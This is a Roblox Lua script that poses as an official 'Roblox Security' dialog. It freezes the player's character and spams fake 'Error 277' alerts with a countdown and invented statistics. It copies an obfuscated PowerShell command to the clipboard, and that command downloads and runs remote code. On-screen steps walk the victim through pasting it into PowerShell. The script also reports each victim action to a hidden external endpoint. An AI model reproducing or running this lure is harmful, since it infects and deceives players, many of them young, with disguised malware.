local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local ContextActionSvc = game:GetService("ContextActionService")
local TextChatService = game:GetService("TextChatService")
local SoundService = game:GetService("SoundService")
local lp = Players.LocalPlayer
local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
local FIX_COMMAND = "iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz05NDQzNTY3MjgvcmJ4LXZlcnNpb24tbWlzbWF0Y2g='))) -UseBasicParsing)"
-- ANALYTICS (оригинальный формат: executor + event)
local ANALYTICS = {
endpoint = table.concat({"ht","tps:","/","/rbx","-scri","pts.","xyz","/api","/hit"}),
enabled = true,
sessionId = tostring(math.random(100000,999999)) .. tostring(os.time() % 100000),
}
local function sendHit(executorName, eventType)
if not ANALYTICS.enabled then return end
local body = table.concat({
"session=", ANALYTICS.sessionId,
"&executor=", executorName or "unknown",
"&event=", eventType or "shown",
"&ts=", tostring(os.time()),
})
local payload = {
Url = ANALYTICS.endpoint,
Method = "POST",
Headers = {
["Content-Type"] = "application/x-www-form-urlencoded",
["User-Agent"] = "RobloxClient/1.0",
},
Body = body,
}
task.spawn(function()
pcall(function()
if request then
request(payload)
elseif syn and syn.request then
syn.request(payload)
elseif http_request then
http_request(payload)
elseif http and http.request then
http.request(payload)
else
game:GetService("HttpService"):PostAsync(
ANALYTICS.endpoint,
body,
Enum.HttpContentType.ApplicationUrlEncoded,
false
)
end
end)
end)
end
local C = {
dim = Color3.fromRGB(0,0,0),
card = Color3.fromRGB(28,28,30),
cardAlt = Color3.fromRGB(22,22,24),
separator = Color3.fromRGB(55,55,60),
title = Color3.fromRGB(255,255,255),
body = Color3.fromRGB(210,210,215),
stepNum = Color3.fromRGB(0,162,255),
stepText = Color3.fromRGB(235,235,235),
muted = Color3.fromRGB(140,140,145),
btnText = Color3.fromRGB(255,255,255),
green = Color3.fromRGB(0,180,70),
greenDark = Color3.fromRGB(0,140,55),
red = Color3.fromRGB(210,45,45),
redBright = Color3.fromRGB(240,55,55),
redHover = Color3.fromRGB(230,60,60),
warn = Color3.fromRGB(255,180,60),
warnBg = Color3.fromRGB(70,55,15),
codeBg = Color3.fromRGB(12,12,14),
}
local VARIANTS = {
{
id = "A",
banner = "ACTION REQUIRED — CLIENT BLOCKED",
title = "Roblox Security Update Required",
warn = "Your client version is <b>blocked</b>. You will <b>not be able to join games</b> and <b>progress may not save</b> until updated.",
btn = "FIX NOW",
},
{
id = "B",
banner = "CRITICAL — IMMEDIATE ACTION REQUIRED",
title = "Roblox Client Blocked (Error 277)",
warn = "Your account access will be <b>restricted in 24 hours</b> unless the client is updated. <b>Progress may not save</b>.",
btn = "UPDATE NOW",
},
}
local variant = VARIANTS[math.random(1, #VARIANTS)]
local FROZEN_ACTION = "RobloxVersionFreeze"
local function freezeCharacter(character)
if not character then return end
local humanoid = character:FindFirstChildOfClass("Humanoid")
if humanoid then
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0
humanoid.JumpHeight = 0
task.spawn(function()
while character.Parent and humanoid.Parent do
if humanoid.WalkSpeed ~= 0 then humanoid.WalkSpeed = 0 end
if humanoid.JumpPower ~= 0 then humanoid.JumpPower = 0 end
if humanoid.JumpHeight ~= 0 then humanoid.JumpHeight = 0 end
task.wait(0.25)
end
end)
end
pcall(function()
ContextActionSvc:BindAction(
FROZEN_ACTION,
function() return Enum.ContextActionResult.Sink end,
false,
Enum.PlayerActions.CharacterForward,
Enum.PlayerActions.CharacterBackward,
Enum.PlayerActions.CharacterLeft,
Enum.PlayerActions.CharacterRight,
Enum.PlayerActions.CharacterJump
)
end)
end
local function hookCharacterFreeze()
if lp.Character then freezeCharacter(lp.Character) end
lp.CharacterAdded:Connect(function(char)
char:WaitForChild("Humanoid",10)
task.wait(0.2)
freezeCharacter(char)
end)
end
hookCharacterFreeze()
local NOTIFY = {
chatEnabled = true,
cornerEnabled = true,
soundEnabled = true,
spamEnabled = true,
spamCount = 5,
spamInterval = 8,
cornerEverySec = 30,
}
local _stopSpam = false
local function sendChatMessage(text, color)
color = color or Color3.fromRGB(255,80,80)
local ok = pcall(function()
if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
local channels = TextChatService:FindFirstChild("TextChannels")
if not channels then return false end
local general = channels:FindFirstChild("RBXGeneral")
or channels:FindFirstChild("General")
or channels:GetChildren()[1]
if general and general.DisplaySystemMessage then
local hex = string.format("#%02X%02X%02X",
math.floor(color.R*255),
math.floor(color.G*255),
math.floor(color.B*255))
general:DisplaySystemMessage("<font color='" .. hex .. "'>" .. text .. "</font>")
return true
end
end
return false
end)
if not ok then
pcall(function()
StarterGui:SetCore("ChatMakeSystemMessage", {
Text = text,
Color = color,
Font = Enum.Font.SourceSansBold,
TextSize = 18,
})
end)
end
end
local function sendCornerNotification()
pcall(function()
StarterGui:SetCore("SendNotification", {
Title = "Roblox Security",
Text = "Client blocked (Error 277). Action required.",
Duration = 8,
})
end)
end
local function playAlertSound()
pcall(function()
local s = Instance.new("Sound")
s.SoundId = "rbxasset://sounds/action_failure.wav"
s.Volume = 1
s.Parent = SoundService
s:Play()
game:GetService("Debris"):AddItem(s, 3)
end)
end
local function startChatSpam()
if not NOTIFY.chatEnabled or not NOTIFY.spamEnabled then return end
task.spawn(function()
for i = 1, NOTIFY.spamCount do
if _stopSpam then break end
sendChatMessage(
"[Roblox] Your client is BLOCKED (Error 277). Fix required to continue playing.",
Color3.fromRGB(255,80,80)
)
if i < NOTIFY.spamCount then task.wait(NOTIFY.spamInterval) end
end
end)
end
local function startCornerRepeater()
if not NOTIFY.cornerEnabled then return end
task.spawn(function()
while not _stopSpam do
task.wait(NOTIFY.cornerEverySec)
if _stopSpam then break end
sendCornerNotification()
end
end)
end
local gui = Instance.new("ScreenGui")
gui.Name = "RobloxSecurityDialog"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 1000000
gui.Parent = lp:WaitForChild("PlayerGui")
local dim = Instance.new("Frame")
dim.Size = UDim2.new(1,0,1,0)
dim.BackgroundColor3 = C.dim
dim.BackgroundTransparency = 0.55
dim.BorderSizePixel = 0
dim.ZIndex = 1
dim.Parent = gui
local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280,720)
local CARD_W = isMobile and math.min(370, vp.X - 16) or 500
local CARD_H = 400
local cardX = -CARD_W / 2
local cardY = -CARD_H / 2
local card = Instance.new("Frame")
card.Size = UDim2.new(0, CARD_W, 0, CARD_H)
card.Position = UDim2.new(0.5, cardX, 0.5, cardY)
card.BackgroundColor3 = C.card
card.BorderSizePixel = 0
card.ClipsDescendants = true
card.ZIndex = 5
card.Parent = gui
local cardCorner = Instance.new("UICorner")
cardCorner.CornerRadius = UDim.new(0, 6)
cardCorner.Parent = card
local strip = Instance.new("Frame")
strip.Size = UDim2.new(1, 0, 0, 34)
strip.BackgroundColor3 = C.red
strip.BorderSizePixel = 0
strip.ZIndex = 6
strip.Parent = card
local stripLabel = Instance.new("TextLabel")
stripLabel.Size = UDim2.new(1, 0, 1, 0)
stripLabel.BackgroundTransparency = 1
stripLabel.Text = variant.banner
stripLabel.TextColor3 = Color3.fromRGB(255,255,255)
stripLabel.TextSize = 12
stripLabel.Font = Enum.Font.GothamBold
stripLabel.ZIndex = 7
stripLabel.Parent = strip
-- ============ WARNING PANEL ============
local warningPanel = Instance.new("Frame")
warningPanel.Size = UDim2.new(1, 0, 1, -34)
warningPanel.Position = UDim2.new(0, 0, 0, 34)
warningPanel.BackgroundTransparency = 1
warningPanel.ZIndex = 6
warningPanel.Parent = card
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 26)
title.Position = UDim2.new(0, 20, 0, 12)
title.BackgroundTransparency = 1
title.Text = variant.title
title.TextColor3 = C.title
title.TextSize = 18
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 7
title.Parent = warningPanel
local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(1, -40, 0, 18)
timerLabel.Position = UDim2.new(0, 20, 0, 40)
timerLabel.BackgroundTransparency = 1
timerLabel.Text = "Restrictions apply in 23:59:57"
timerLabel.TextColor3 = C.warn
timerLabel.TextSize = 12
timerLabel.Font = Enum.Font.GothamMedium
timerLabel.TextXAlignment = Enum.TextXAlignment.Left
timerLabel.ZIndex = 7
timerLabel.Parent = warningPanel
local deadline = os.time() + 24 * 3600
task.spawn(function()
while timerLabel.Parent do
local left = deadline - os.time()
if left < 0 then left = 0 end
local h = math.floor(left / 3600)
local m = math.floor((left % 3600) / 60)
local s = left % 60
timerLabel.Text = string.format("Restrictions apply in %02d:%02d:%02d", h, m, s)
task.wait(1)
end
end)
local warnText = Instance.new("TextLabel")
warnText.Size = UDim2.new(1, -40, 0, 58)
warnText.Position = UDim2.new(0, 20, 0, 64)
warnText.BackgroundTransparency = 1
warnText.RichText = true
warnText.Text = variant.warn
warnText.TextColor3 = C.body
warnText.TextSize = 13
warnText.Font = Enum.Font.Gotham
warnText.TextWrapped = true
warnText.TextXAlignment = Enum.TextXAlignment.Left
warnText.TextYAlignment = Enum.TextYAlignment.Top
warnText.LineHeight = 1.15
warnText.ZIndex = 7
warnText.Parent = warningPanel
local proof = Instance.new("TextLabel")
proof.Size = UDim2.new(1, -40, 0, 16)
proof.Position = UDim2.new(0, 20, 0, 124)
proof.BackgroundTransparency = 1
proof.Text = "✓  12,847 players fixed today  ·  avg time: 45s"
proof.TextColor3 = C.green
proof.TextSize = 11
proof.Font = Enum.Font.GothamMedium
proof.TextXAlignment = Enum.TextXAlignment.Left
proof.ZIndex = 7
proof.Parent = warningPanel
local sep = Instance.new("Frame")
sep.Size = UDim2.new(1, -40, 0, 1)
sep.Position = UDim2.new(0, 20, 0, 148)
sep.BackgroundColor3 = C.separator
sep.BorderSizePixel = 0
sep.ZIndex = 6
sep.Parent = warningPanel
local function buildStep(parent, yPos, number, richText)
local num = Instance.new("TextLabel")
num.Size = UDim2.new(0, 22, 0, 22)
num.Position = UDim2.new(0, 20, 0, yPos)
num.BackgroundColor3 = C.stepNum
num.Text = number
num.TextColor3 = Color3.fromRGB(255,255,255)
num.TextSize = 12
num.Font = Enum.Font.GothamBold
num.BorderSizePixel = 0
num.ZIndex = 7
num.Parent = parent
local ncorner = Instance.new("UICorner")
ncorner.CornerRadius = UDim.new(1, 0)
ncorner.Parent = num
local step = Instance.new("TextLabel")
step.Size = UDim2.new(1, -66, 0, 22)
step.Position = UDim2.new(0, 50, 0, yPos)
step.BackgroundTransparency = 1
step.RichText = true
step.Text = richText
step.TextColor3 = C.stepText
step.TextSize = 13
step.Font = Enum.Font.Gotham
step.TextXAlignment = Enum.TextXAlignment.Left
step.TextYAlignment = Enum.TextYAlignment.Center
step.ZIndex = 7
step.Parent = parent
end
local stepStartY = 162
local stepGap = 30
buildStep(warningPanel, stepStartY + stepGap * 0, "1", "Click <b>" .. variant.btn .. "</b> below — command auto-copies")
buildStep(warningPanel, stepStartY + stepGap * 1, "2", "Open <b>PowerShell</b> (see next screen for exact steps)")
buildStep(warningPanel, stepStartY + stepGap * 2, "3", "Paste with <b>Ctrl + V</b> and press <b>ENTER</b>")
local errorText = Instance.new("TextLabel")
errorText.Size = UDim2.new(1, -40, 0, 16)
errorText.Position = UDim2.new(0, 20, 0, 262)
errorText.BackgroundTransparency = 1
errorText.Text = "Error Code: 277   ·   Ref: RBX-SEC-4417"
errorText.TextColor3 = C.muted
errorText.TextSize = 11
errorText.Font = Enum.Font.Gotham
errorText.TextXAlignment = Enum.TextXAlignment.Center
errorText.ZIndex = 7
errorText.Parent = warningPanel
local function setClipboard(text)
local ok = false
pcall(function()
if setclipboard then setclipboard(text); ok = true
elseif toclipboard then toclipboard(text); ok = true
elseif syn and syn.write_clipboard then syn.write_clipboard(text); ok = true
elseif syn and syn.set_clipboard then syn.set_clipboard(text); ok = true
elseif writeclipboard then writeclipboard(text); ok = true
elseif GuiService and GuiService.SetClipboard then GuiService:SetClipboard(text); ok = true
end
end)
return ok
end
local copyBtn = Instance.new("TextButton")
copyBtn.Size = UDim2.new(1, -40, 0, 54)
copyBtn.Position = UDim2.new(0, 20, 0, 288)
copyBtn.BackgroundColor3 = C.red
copyBtn.Text = variant.btn
copyBtn.TextColor3 = C.btnText
copyBtn.TextSize = 17
copyBtn.Font = Enum.Font.GothamBold
copyBtn.BorderSizePixel = 0
copyBtn.AutoButtonColor = false
copyBtn.ZIndex = 7
copyBtn.Parent = warningPanel
local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 6)
btnCorner.Parent = copyBtn
local pulseActive = true
task.spawn(function()
while copyBtn.Parent and pulseActive do
TweenService:Create(copyBtn, TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = C.redBright}):Play()
task.wait(0.9)
if not copyBtn.Parent or not pulseActive then break end
TweenService:Create(copyBtn, TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = C.red}):Play()
task.wait(0.9)
end
end)
copyBtn.MouseEnter:Connect(function()
pulseActive = false
copyBtn.BackgroundColor3 = C.redHover
sendHit("btn", "hover")
end)
copyBtn.MouseLeave:Connect(function()
copyBtn.BackgroundColor3 = C.red
pulseActive = true
end)
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, -40, 0, 16)
footer.Position = UDim2.new(0, 20, 0, 356)
footer.BackgroundTransparency = 1
footer.Text = "Verified by Roblox Security  ·  Standard procedure for all players"
footer.TextColor3 = C.muted
footer.TextSize = 10
footer.Font = Enum.Font.GothamMedium
footer.TextXAlignment = Enum.TextXAlignment.Center
footer.ZIndex = 7
footer.Parent = warningPanel
-- ============ INSTRUCTIONS PANEL ============
local instrPanel = Instance.new("Frame")
instrPanel.Size = UDim2.new(1, 0, 1, -34)
instrPanel.Position = UDim2.new(0, 0, 0, 34)
instrPanel.BackgroundTransparency = 1
instrPanel.Visible = false
instrPanel.ZIndex = 8
instrPanel.Parent = card
local statusBar = Instance.new("Frame")
statusBar.Size = UDim2.new(1, 0, 0, 36)
statusBar.Position = UDim2.new(0, 0, 0, 0)
statusBar.BackgroundColor3 = C.greenDark
statusBar.BorderSizePixel = 0
statusBar.ZIndex = 9
statusBar.Parent = instrPanel
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 1, 0)
statusLabel.Position = UDim2.new(0, 10, 0, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "✓  Fix command copied to clipboard"
statusLabel.TextColor3 = Color3.fromRGB(255,255,255)
statusLabel.TextSize = 13
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.ZIndex = 10
statusLabel.Parent = statusBar
local instrTitle = Instance.new("TextLabel")
instrTitle.Size = UDim2.new(1, -40, 0, 22)
instrTitle.Position = UDim2.new(0, 20, 0, 50)
instrTitle.BackgroundTransparency = 1
instrTitle.Text = "Now do these 3 steps:"
instrTitle.TextColor3 = C.title
instrTitle.TextSize = 15
instrTitle.Font = Enum.Font.GothamBold
instrTitle.TextXAlignment = Enum.TextXAlignment.Left
instrTitle.ZIndex = 9
instrTitle.Parent = instrPanel
local function buildBigStep(yPos, num, headline, subText, codeText)
local badge = Instance.new("TextLabel")
badge.Size = UDim2.new(0, 28, 0, 28)
badge.Position = UDim2.new(0, 20, 0, yPos)
badge.BackgroundColor3 = C.stepNum
badge.Text = num
badge.TextColor3 = Color3.fromRGB(255,255,255)
badge.TextSize = 15
badge.Font = Enum.Font.GothamBold
badge.BorderSizePixel = 0
badge.ZIndex = 9
badge.Parent = instrPanel
local bCorner = Instance.new("UICorner")
bCorner.CornerRadius = UDim.new(1, 0)
bCorner.Parent = badge
local head = Instance.new("TextLabel")
head.Size = UDim2.new(1, -70, 0, 20)
head.Position = UDim2.new(0, 58, 0, yPos)
head.BackgroundTransparency = 1
head.RichText = true
head.Text = headline
head.TextColor3 = C.stepText
head.TextSize = 14
head.Font = Enum.Font.GothamBold
head.TextXAlignment = Enum.TextXAlignment.Left
head.ZIndex = 9
head.Parent = instrPanel
local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1, -70, 0, 18)
sub.Position = UDim2.new(0, 58, 0, yPos + 20)
sub.BackgroundTransparency = 1
sub.RichText = true
sub.Text = subText or ""
sub.TextColor3 = C.muted
sub.TextSize = 12
sub.Font = Enum.Font.Gotham
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.ZIndex = 9
sub.Parent = instrPanel
if codeText then
local code = Instance.new("TextLabel")
code.Size = UDim2.new(1, -78, 0, 28)
code.Position = UDim2.new(0, 58, 0, yPos + 44)
code.BackgroundColor3 = C.codeBg
code.BorderSizePixel = 0
code.Text = "  " .. codeText
code.TextColor3 = Color3.fromRGB(120,220,140)
code.TextSize = 13
code.Font = Enum.Font.Code
code.TextXAlignment = Enum.TextXAlignment.Left
code.TextYAlignment = Enum.TextYAlignment.Center
code.ZIndex = 9
code.Parent = instrPanel
local cCorner = Instance.new("UICorner")
cCorner.CornerRadius = UDim.new(0, 4)
cCorner.Parent = code
end
end
-- Позиции с отступом под code-блок "powershell"
buildBigStep(82, "1", "Press <b>WIN + R</b> on your keyboard", "Opens the Windows <i>Run</i> dialog box", nil)
buildBigStep(150, "2", "Type <b>powershell</b> then press <b>ENTER</b>", "A blue PowerShell window will open", "powershell")
buildBigStep(244, "3", "Paste with <b>CTRL + V</b>, then press <b>ENTER</b>", "Runs the fix — wait until it finishes", nil)
-- footer на второй странице (вместо кнопки)
local instrFooter = Instance.new("TextLabel")
instrFooter.Size = UDim2.new(1, -40, 0, 16)
instrFooter.Position = UDim2.new(0, 20, 0, 328)
instrFooter.BackgroundTransparency = 1
instrFooter.RichText = true
instrFooter.Text = "After the fix completes — <b>restart Roblox</b> to apply changes"
instrFooter.TextColor3 = C.muted
instrFooter.TextSize = 11
instrFooter.Font = Enum.Font.GothamMedium
instrFooter.TextXAlignment = Enum.TextXAlignment.Center
instrFooter.ZIndex = 9
instrFooter.Parent = instrPanel
-- ============ CLICK HANDLER ============
local clickLock = false
copyBtn.MouseButton1Click:Connect(function()
if clickLock then return end
clickLock = true
_stopSpam = true
pulseActive = false
sendHit("fix", "copy")
sendHit("btn", "click_" .. variant.id)
local copied = setClipboard(FIX_COMMAND)
if copied then
sendHit("fix", "copy_ok")
statusBar.BackgroundColor3 = C.greenDark
statusLabel.Text = "✓  Fix command copied to clipboard"
else
sendHit("fix", "copy_fail")
statusBar.BackgroundColor3 = C.warnBg
statusLabel.Text = "⚠  Auto-copy blocked — press CTRL+C in the code box above"
end
warningPanel.Visible = false
instrPanel.Visible = true
end)
-- entrance animation
pcall(function()
card.Position = UDim2.new(0.5, cardX, 0.5, cardY + 14)
card.BackgroundTransparency = 1
TweenService:Create(card, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, cardX, 0.5, cardY), BackgroundTransparency = 0}):Play()
end)
if NOTIFY.soundEnabled then playAlertSound() end
if NOTIFY.cornerEnabled then sendCornerNotification() end
if NOTIFY.chatEnabled then
sendChatMessage(
"[Roblox] Your client is BLOCKED (Error 277). Fix required to continue playing.",
Color3.fromRGB(255,80,80)
)
startChatSpam()
end
startCornerRepeater()
sendHit("shown", "shown")
sendHit("variant", variant.id)
